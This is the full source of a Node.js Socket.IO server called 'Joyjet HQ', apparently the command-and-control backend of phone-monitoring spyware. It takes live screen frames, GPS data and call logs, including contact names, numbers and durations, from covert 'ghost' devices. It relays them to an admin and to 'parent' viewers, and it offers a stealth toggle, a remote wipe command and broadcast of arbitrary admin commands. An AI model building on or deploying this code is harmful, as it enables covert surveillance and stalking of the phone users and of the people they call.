require('dotenv').config(); 
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);

// 1. HIGH-PERFORMANCE ENGINE CONFIG
// 100MB buffer for HD frames + optimized ping for mobile stability
const io = new Server(server, {
  maxHttpBufferSize: 1e8, 
  pingInterval: 10000,
  pingTimeout: 5000,
  cors: { origin: "*" }
});

// 2. SECURITY & CONFIG
const PUBLIC_URL = "https://joyjet-server.onrender.com";
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY; 
let viewers = new Map(); // Tracks active viewer sessions

// 3. RENDER KEEP-ALIVE (Self-Heartbeat)
setInterval(async () => {
  try {
    await axios.get(PUBLIC_URL);
    console.log('Heartbeat: System Active');
  } catch (err) {
    console.log('Heartbeat: Pulse Sent');
  }
}, 600000); // 10 Minutes

// 4. MAIN COMMUNICATIONS HUB
io.on('connection', (socket) => {
  console.log('Node Linked:', socket.id);

  // DYNAMIC ROLE & PERMISSION SYSTEM
  socket.on('claim_role', (data) => {
    const nameLower = data.name.trim().toLowerCase();
    const providedKey = data.key;

    // A. ADMIN AUTHENTICATION
    if (nameLower === "admin") {
      if (providedKey === ADMIN_KEY) {
        socket.join("admin_room");
        socket.emit('role_assigned', { role: 'ADMIN', name: "SYSTEM_MASTER" });
        console.log("Admin Authorized.");
      } else {
        socket.emit('system_alert', { msg: "ACCESS DENIED: INVALID KEY" });
        socket.disconnect();
      }
    } 
    // B. VIEWER LOGIC (Parent - No underscore)
    else if (!nameLower.includes('_')) {
      viewers.set(socket.id, { name: nameLower, hidden: false });
      socket.join(`viewer_room_${nameLower}`);
      socket.emit('role_assigned', { role: 'VIEWER', name: data.name });
      console.log(`Viewer [${data.name}] monitoring assigned nodes.`);
    } 
    // C. GHOST LOGIC (Child Node - Has underscore)
    else {
      socket.emit('role_assigned', { role: 'GHOST', name: data.name });
      // Alert Admin that a node is active
      io.to("admin_room").emit('system_alert', { msg: `Node [${data.name}] Online.` });
    }
  });

  // STEALTH TOGGLE (For Viewers)
  socket.on('toggle_visibility', (data) => {
    if (viewers.has(socket.id)) {
        let v = viewers.get(socket.id);
        v.hidden = data.hidden;
        viewers.set(socket.id, v);
    }
  });

  // HIGH-QUALITY HD RELAY (Ghost -> Admin/Viewer)
  socket.on('screen_frame', (payload) => {
    // payload: { ghostName: "Alpha_01", frame: "base64..." }
    
    // 1. Always relay to Admin (using volatile for lag-free performance)
    io.to("admin_room").volatile.emit('screen_frame', payload);
    
    // 2. Relay to specific Parent (Viewer)
    viewers.forEach((vData, vSocketId) => {
      if (!vData.hidden) {
        const prefix = vData.name + "_";
        if (payload.ghostName.toLowerCase().startsWith(prefix)) {
          io.to(`viewer_room_${vData.name}`).volatile.emit('screen_frame', payload);
        }
      }
    });
  });

  // GPS & SENSOR RELAY
  socket.on('ghost_location_data', (payload) => {
    io.to("admin_room").emit('ghost_update', payload);
    viewers.forEach((vData, vSocketId) => {
      const prefix = vData.name + "_";
      if (payload.ghostName.toLowerCase().startsWith(prefix)) {
        io.to(`viewer_room_${vData.name}`).emit('ghost_update', payload);
      }
    });
  });

  // COMMAND RELAY (Admin -> Ghost/Global)
  socket.on('admin_wipe', (targetId) => {
    // Security check: only if sender is in admin_room
    if (socket.rooms.has("admin_room")) {
        io.to(targetId).emit('admin_command', 'WIPE_SERVICE');
    }
  });

  socket.on('admin_command', (cmd) => {
    if (socket.rooms.has("admin_room")) {
        socket.broadcast.emit('admin_command', cmd);
    }
  });

  // MONITOR GHOST PHONE CALL LOGS
socket.on('ghost_activity', (payload) => {
    if (payload.type === 'CALL_LOG_SYNC') {
        // Unpack the logs and send them to the Admin individually
        payload.data.forEach(call => {
            const logEntry = {
                timestamp: new Date().toLocaleTimeString(),
                message: `CALL: ${call.name} (${call.number}) | Type: ${call.type} | Duration: ${call.duration}s`,
                name: payload.name
            };
            io.to('admin_room').emit('activity_log', logEntry);
        });
    } else {
        // Standard activity
        io.to('admin_room').emit('activity_log', payload);
    }
});


  // DISCONNECT CLEANUP
  socket.on('disconnect', () => {
    viewers.delete(socket.id);
    console.log('Node Unlinked:', socket.id);
  });
});

// SERVER ENTRY POINT
app.get('/', (req, res) => res.send('Joyjet HQ: Secure Hub Operational'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Master Server running on port ${PORT}`));
